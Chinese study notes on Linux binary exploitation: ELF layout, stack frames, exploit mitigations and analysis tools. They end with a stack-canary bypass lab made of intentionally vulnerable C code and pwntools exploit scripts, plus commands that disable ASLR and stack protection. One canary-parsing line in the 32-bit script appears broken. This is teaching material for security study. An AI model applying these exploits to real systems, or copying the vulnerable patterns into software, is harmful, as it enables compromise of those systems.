# 从C源码到可执行文件的生成过程

![[Pasted image 20221104200518.png]]
## 程序的编译与链接
![[Pasted image 20221104200639.png]]


## 可执行文件定义
![[Pasted image 20221105090550.png]]

## 可执行文件分类PE/ELF
![[Pasted image 20221105091900.png]]
## ELF文件格式  [关于LINUX（Linux Foundation Referenced Specifications）](https://refspecs.linuxfoundation.org/)
![[Pasted image 20221105091929.png]]
## 区分节和段的存储区域
![[Pasted image 20221105093425.png]]
## 加载ELF / 查看节和段区分布命令
![](20210318093021888.png)  
`注：`这里有两条命令和分别查看磁盘和[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)中的ELF节和段的分布。
-   磁盘上查看节分布：`objdump -s [elf文件]`
-   内存进程上查看段分布：  
    方法一：  
    可先 ，`./elf文件 &` //&后台进程挂起,显示pid然后，`cat /proc/[pid]/maps` //查看段分布方法二：  
    `gdb ./elf文件` //先gdb调试`vmmap` //查看段分布
# 段（segment）与节(section)
![](20210318093719868.png)
# 程序数据在内存中的组织分布
![[Pasted image 20221105093331.png]]
以上例子仅供参照。可以自己写一个demo然后调试一步一步查看相应信息。

# 大端序与小端序存储
![](20210318093931255.png)

  

# 关键[寄存器](https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020)
![](20210318094036142.png)  
右图是CSAPP里面的，看不清没关系（网上一大堆），  
关键了解最重要的三个寄存器作用：

-   RIP控制CPU执行指令

-   RSP,RBP控制函数栈帧区域（`栈帧`这里分享两篇硬核文章，就不重复造轮子了，好的资源就得充分利用。）

[C语言函数调用栈(一)](https://www.cnblogs.com/clover-toeic/p/3755401.html)  
[C语言函数调用栈(二)](https://www.cnblogs.com/clover-toeic/p/3756668.html)  
这两篇能帮你熟悉`函数递归调用`详细过程，同时了解PWN中栈利用最重要的一环知识—栈帧。  
`注：`这两篇内容量对于初学者来说有点大，不过别灰心，只要肯多花时间一定能了解的大概（本人当初也是这么过来的，当你想放弃的时候就就参照笨笨的博主，当初我可是看了好多遍的。这样你总会信心倍增了吧，哈哈哈。）最后一点就是学习一起的最好动力就是兴趣（跟你智商高低没多大关系），如果你没兴趣，友情劝退还是别浪费时间了，这世界这么多选择，赶紧找个自己喜欢的方向发展才是对自己最好的。（哈哈哈，太哲学了，赶紧继续正题了）

# 静态链接与[动态链接](https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5&spm=1001.2101.3001.7020)

-   静态链接  
    简单举例来说，就是你用的东西都是你自己买好的，专属于你。
![](20210318095617326.png)
-   动态链接  
    我用的东西都是借别人的，在需要的时候从有的地方借来用用就好了，跟别人共享着使用。
![](20210318095657789.png)
# 常用汇编指令影响范围（牢记）
-   leave等价  
    mov esp, ebp;  
    pop ebp

-   RETN 等价 POP EIP; sub sp, n //还起到平衡堆栈的作用  
    改变ESP 和 EIP（near）

-   RETF等价pop eip;pop cs  
    改变EIP和CS(far)

-   CALL 等价 PUSH [EIP+硬编码数]  
    改变ESP 和 EIP

-   JMP 本质只改变eip

# intel 和 AT&T汇编格式

这在我别的文章也有专门的讲解，这里简单对照即可。
-   intel  
    opcode dst, src //源和目的操作位与AT&T正相反

-   AT&T  
    opcodel src, dst //同时寄存器前多个%，l是代表long长整型  
    ![](20210318095810738.png)

# 溢出防护机制

全面了解保护机制  
1. [LINUX漏洞缓解机制介绍](https://www.sohu.com/a/295470303_467784)  
2.[推荐作者，分析的都很详细，文章例子在他文章里附的github链接里](https://blog.csdn.net/ylcangel/category_9437275.html?spm=1001.2014.3001.5482)

## PIE（Position-independent code）

-   每次加载时，`程序的基址`和`libc的基址`都发生变化。

在计算中，与位置无关的代码（PIC ）或与位置无关的可执行文件（PIE）是机器代码的主体，它们被放置在主存储器中的某个位置，无论其绝对地址如何，都可以正确执行 。  
PIC通常用于共享库，因此可以将相同的库代码加载到每个程序地址空间中不与使用中的其他内存（例如，其他共享库）重叠的位置。 PIC还用于缺少MMU的较旧的计算机系统上，因此，即使在无MMU的系统的单个地址空间内，操作系统也可以使应用程序彼此远离。

**位置无关的代码必须使用相对寻址。**

## ASLR（Address space layout randomization）

-   每次加载时，`libc的基址`发生变化。

地址空间布局随机化（ASLR）是一种计算机安全技术，可防止利用内存损坏漏洞。 为了防止攻击者可靠地跳转到内存中的某个特定漏洞利用功能，**ASLR随机排列进程的关键数据区域的地址空间位置**，包括可执行文件的基础以及堆栈，堆的位置 和共享库。  
`LINUX下关闭ASLR`

echo 0 > /proc/sys/kernel/randomize_va_space
1

## NX bit (no-execute)

NX位（不执行）是一项用于CPU的技术，用于分隔内存区域，供处理器指令（代码）存储或数据存储使用，该功能通常仅在哈佛体系结构处理器中才能使用。 但是，出于安全原因，NX位越来越多地用于常规的von Neumann体系结构处理器中。

## DEP( Data Execution Prevention)

操作系统的系统级内存保护功能。标记内存页为不可执行。

## RELRO(RELocation Read-Only,只读重定位)

这个机制启动等级有部分开启和完全开启。

## Canary

### 对抗canary策略

1，泄露canary值  
2，泄露fs:28H内的值  
3，覆写fs:28H副本值  
4，劫持stack_chk_fail  
5，stack smashing  
6，逐字节爆破（BROP gadget，相对限制多）

# GOT（global offset table）| PLT（procedure linkage table）

GOT和PLT的理解对漏洞成因分析是很重要的，同时理解也是很绕的，分享一下各位大神的分析（望大家多多支持各位作者的分享精神）

1.[GOT表 和 PLT表](https://blog.csdn.net/prettyX/article/details/107404509)[这篇看完基本做PWN题就能搞懂了]  
2.[这里附个视频讲解的，给看文字比较难懂的同学](https://www.bilibili.com/video/BV1a7411p7zK?from=search&seid=7432027928069021725)  
3.[二进制漏洞挖掘之栈溢出-开启RELRO](https://blog.csdn.net/ylcangel/article/details/102625948)[这篇分析的很详细，加深对LINUX保护机制的理解，后半部分理解需要一定的知识积累]  
4.[Linux二进制ELF程序查找symbol过程分析](https://blog.csdn.net/weixin_46222091/article/details/108668735)[这篇跟3类似，从保护机制上分析PLT和GOT的内容]

`建议：`为了加深理解印象，最好自己一步一步调试跟进去看看。

`过程：`  
1，gdb调试看看got表，查看哪些函数还未被加载。  
![](2021032123584861.png)  
2，这里看个PUTS函数，下断

![](20210325092803592.png)  
3，断下si跟进  
![](2021032509285092.png)4，来到plt表  
![](20210325093158614.png)  
5，重新运行，直接n步过  
![](20210325093343466.png)  
6，继续看看got表

![](20210325093436728.png)  
已被填入puts真正地址  
![](20210325093513937.png)

7，查看上面plt表中第一个jmp [got表里面的地址]（0x804a014）

![](20210325093736753.png)  
`结论：`plt 表中，jmp [地址]。  
第一次还未装载函数时，地址=got表地址（去找到函数真正地址）；  
第二次执行，地址=函数真正地址。

# 泄露libc地址

原理:动态连接程序中，本程序中含有的函数达不到需要实现的目的，需要借助`动态链接库`中的函数实现其目的。

## 查找使用的动态链接库信息

原理：由于在`分页机制`，在LINUX系统下是以`4k`为单位，即12位（2^12=4k），所以利用此规则，即便开启了地址随机化保护机制，地址的`后三位(在页中的偏移)`也是不变的。  
下图举例说明：  
![](20210321232355389.png)然后在在线libc库查就好了  
![](20210321232454171.png)  
这里的offset都是`偏移RVA`。还需要得出  
`基址=puts(VA) - puts(offset)`

[在线工具网站1](https://libc.rip/)  
[在线工具网站2](https://libc.blukat.me/?q=puts%3A420&l=libc6-i386_2.31-9_amd64)

`注：`当然方法还有别的，只要达到目的都可行。

# 工具

# ldd

**1.概述>**  
ldd命令 用于打印程序或者库文件所依赖的共享库列表。

**2.语法>**  
ldd(选项)(参数)

选项
--version：打印指令版本号；
-v：详细信息模式，打印所有相关信息；
-u：打印未使用的直接依赖；
-d：执行重定位和报告任何丢失的对象；
-r：执行数据对象和函数的重定位，并且报告任何丢失的对象和函数；
--help：显示帮助信息。
123456

`参数`  
文件：指定可执行程序或者文库。

**3.实例>**  
![](20210319104224767.png)  
红色标记处是一个软链接（相当于win下的快捷键）  
可到`/lib/x86_64-linux-gnu/`目录下  
`命令：file libc.so.6`查看链接属性

**4.原理补充说明**

**首先ldd不是一个可执行程序，而只是一个shell脚本。**
  
ldd能够显示可执行模块的dependency，其原理是通过设置一系列的环境变量。

ldd显示可执行模块的dependency的工作原理，其`实质`是通过ld-linux.so（elf动态库的`装载器`）来实现的。我们知道，ld- linux.so模块会先于executable模块程序工作，并获得控制权，因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency。

实际上可以直接执行ld-linux.so模块，如：/lib/ld-linux.so.2 --list program（这相当于ldd program）

# objdump

objdump 有点像那个快速查看之类的工具，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。对于一般只想让自己程序跑起来的程序员，这个命令没有更多意义，对于想进一步了解系统的程序员，应该掌握这种工具，至少你可以自己写写shellcode了，或者看看人家给的 exploit 中的 shellcode 是什么东西。

常用命令选项：

-   `objdump -D -b binary -m i386 [file]`  
    -D表示对全部文件进行反汇编;  
    -b表示二进制;  
    -m表示指令集架构;  
    file就是我们要反汇编的二进制文件;  
    同时我们也可以指定big-endian或little-endian（-EB或-EL）;

`objdump -f [file]` *显示file的文件头信息;

`objdump -t file` *输出目标文件的`符号表`;

`objdump -h file` *显示file的Section Header信息;

`objdump -x file` 显示file的全部Header信息;

`-S file` *输出目标文件的符号表, 当gcc -g时打印更明显;`[S大写]`  
`-s file` 除了显示file的全部Header信息，还显示他们对应的十六进制文件代码;

`-d file` *反汇编file中的需要执行指令的那些section;`-D file` 与-d类似，但反汇编file中的所有section;

`-R` *显示动态链接重定位信息;`-r` 显示重定位信息;

`objdump -s libc.so>test.txt` 输出到txt文件

-   查看PLT表  
    `objdump -d -j .plt file`

-   查看GOT表  
    `objdump -R file`

`注：`*号的一帮经常用。

# readelf

**1.概述>**  
readelf命令，一般用于查看ELF格式的文件信息，常见的文件如在Linux上的可执行文件，动态库(_.so)或者静态库(_.a) 等包含ELF格式的文件。

**2.常用参数>**  
`语法：`readelf (选项)(file)  
`-h` (elf header)，显示elf文件开始的文件头信息。`-l` (program headers),segments 显示程序头（段头）信息(如果有数据的话)。`-S` (section headers),sections 显示节头信息(如果有数据的话)。`-g` (section groups),显示节组信息(如果有数据的话)。`-s` (symbols) 显示符号表段中的项（如果有数据的话）。`-e` headers 显示全部头信息，等价于: -h -l -S 。`-r` relocs 显示可重定位段的信息。`-d` dynamic 显示动态段的信息。`-V` version-info 显示版本段的信息。

`附：`命令参数参考：[GNU Binary Utilities（英文版）](http://sourceware.org/binutils/docs/binutils/readelf.html)

# ROPgadget

**概述>**  
查找文件中一些需要的`指令`和`字符串`等。

看帮助手册吧  
命令：`ROPgadget -h`

常用命令
ROPgadget --binary [file] --string [...]	//后面根据需要自己补充，如下另一个使用例子
ROPgadget --binary 文件名 --only "pop|ret" | grep rdi
12

# GCC

[工具篇_GCC](https://blog.csdn.net/weixin_44309300/article/details/114646246)

补充常用保护相关参数
-no-pie：关闭地址随机化
-fno-stack-protector：关闭堆栈保护
-z execstack：堆栈可执行
-m32: 生成32位文件
1234567

### 常用汇编指令：

ADD(加)

 ADD 被加数, 加数
1

AND（逻辑与）

AND 目标数, 原数   
1

CALL（调用）

CALL 相对地址
1

CMP（比较）

CMP 目标数，原数
CMP指令比较两个值并且标记CF、OF、ZF：
CMP     EAX, EBX             # 比较eax和ebx是否相等，如果相等就设置ZF为1
CMP     EAX,[404000]         # 比较eax和偏移量为[404000]的值是否相等
CMP     [404000],EAX         # 比较[404000]是否与eax相等
12345

DEC（自减）

DEC 相对地址 
1

INC（自加）

INC 相对地址
1

INT

INT 相对地址

12

MOV（传送赋值）

MOV 目标数，原数
1

POP  
PUSH

POP 相对地址
PUSH 相对地址
12

RET（返回）

RET 相对地址
1

SUB（减）

  

SUB 目标数，原数
1

  

TEST

  

TEST 操作符，操作符

  

# 函数调用栈结构的具体细节

  

## [虚拟内存](https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)中所处位置

  

由于函数调用栈由高地址向低地址生长，故其在虚拟内存中所处地址较高，与堆共享同一块[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)区域，增长方向相反。  
![](20200822123542506.png)

  

## 栈帧(Stack [Frame](https://so.csdn.net/so/search?q=Frame&spm=1001.2101.3001.7020))

  

栈帧是用于**记录函数调用关系**、**恢复函数执行状态**的信息。每次在调用新的函数时，便会在函数调用栈中创建一个新的栈帧。

  

一个栈帧由高地址向低地址依次包括以下内容：

  

1.  子函数所需参数：父函数调用子函数时会先压入子函数所需的参数，且为逆序入栈

2.  子函数返回地址：调用子函数指令之后的下一条指令地址

3.  父函数栈帧的栈底位置（prev ebp）：指向父函数所保存的prev ebp所处位置

4.  部分寄存器信息

5.  子函数的本地变量  
    ![](20200822131252383.png)

  

# 程序运行时函数调用栈的变化

  

## 相关[寄存器](https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020)

  

函数状态主要涉及三个寄存器 —— esp，ebp，eip。

  

-   **esp** 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。

-   **ebp** 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。

-   **eip** 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。

  

## 运行过程及变化

  

### 1. 调用子函数时的步骤

  

1.  首先调用函数将子函数的参数按照逆序依次压入栈内。如果被子函数不需要参数，则没有这一步骤。**这些参数仍会保存在父函数的函数状态内，之后压入栈内的数据都会作为子函数的函数状态来保存**。  
2. ![[Pasted image 20221105093027.png]]

2.  父函数将调用子函数的指令之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。  
    ![](20200822132043588.png)

3.  子函数将父函数的ebp 寄存器的值（也就是父函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样父函数的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。  
    ![](2020082215524496.png)

4.  将子函数的局部变量等数据压入栈内。  
    ![](20200822161303422.png)

  

### 2. 返回父函数时的步骤

  

1.  子函数的局部变量会从栈内直接弹出，栈顶会指向子函数的基地址。  
    ![](2020082216571131.png)

2.  将基地址内存储的父函数的基地址从栈内弹出，并存到 ebp 寄存器内。这样父函数的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。  
    ![](20200822170818547.png)

3.  将返回地址从栈内弹出，并存到 eip 寄存器内。这样父函数的信息得以恢复。至此父函数的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。  
    ![](20200822171013863.png)

  

# 一些注意事项

  

1.  x86架构下，子函数的参数直接压入栈，但AMD64架构下，子函数的前六个参数先存入寄存器中，依次为rdi、rsi、rdx、rcx、r8、r9 寄存器，第七个之后的参数再入栈。

2.  intel和amd的汇编语言功能基本相同，格式略有差别，其中最大的差别是两种汇编语言的目的操作数和源操作数位置相反

  

x86 栈结构大致如下：

  

        High  
        Address |                 |  
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
                | old ebp         |
      ebp =>    +-----------------+
                | ebx             |
    ebp-4 =>    +-----------------+
                | unknown         |
    ebp-8 =>    +-----------------+
                | canary value    |
   ebp-12 =>    +-----------------+
                | 局部变量         |
        Low     |                 |
        Address

  

x64 :  
函数序言：

  

mov    rax,QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8],rax

  

函数返回前：

  

mov    rax,QWORD PTR [rbp-0x8]
xor    rax,QWORD PTR fs:0x28
je     0x401232 <vuln+102> # 正常函数返回
call   0x401040 <__stack_chk_fail@plt> # 调用出错处理函数

  

x64 栈结构大致如下：

  

        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
                | old ebp         |
      rbp =>    +-----------------+
                | canary value    |
    rbp-8 =>    +-----------------+
                | 局部变量         |
        Low     |                 |
        Address

  

## 0x3 绕过

  

### 0x3.1 泄露栈中的Canary

  

Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。

  

#### 利用示例

  

源代码如下：

  

// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}

  

编译为 32bit 程序，开启 NX，ASLR，Canary 保护,需要关闭PIE

  

gcc -m32 -no-pie ex2.c -o ex2-x86

  

linux默认开启 NX，ASLR，Canary 保护  
首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中

  

#### EXP

  

#!/usr/bin/env python

from pwn import *

context.binary = 'ex2-x86'
# context.log_level = 'debug'
io = process('./ex2-x86')

get_shell = ELF("./ex2-x86").sym["getshell"] # 这里是得到getshell函数的起始地址

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\n' 对应的十六进制就是0xa

io.recvuntil("A"*100)
Canary = u32(int.from_bytes(io.recv(4),"little"))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = b"\x90"*100+p32(Canary)+b"\x90"*12+p32(get_shell) # 使用getshell的函数地址覆盖原来的返回地址
io.send(payload)

io.recv()

io.interactive()

  

编译为64位程序：

  

gcc -no-pie ex2.c -o ex2-x64

  

#### EXP

  

#!/usr/bin/env python

from pwn import *

context.binary = 'ex2-x64'
# context.log_level = 'debug'
io = process('./ex2-x64')

get_shell = ELF("./ex2-x64").sym["getshell"] # 这里是得到getshell函数的起始地址

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100 + "A" * 4 # 这里再加4个 A 是因为 100 模 8 是 4 ，如果不补齐 8 位，则无法覆盖canary后面的 \x00
io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\n' 对应的十六进制就是0xa

io.recvuntil("A"*104)
Canary = u64(io.recv(8))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = b"\x90"*104+p64(Canary)+b"\x90"*8+p64(get_shell) # 使用getshell的函数地址覆盖原来的返回地址
io.send(payload)

io.recv()

io.interactive()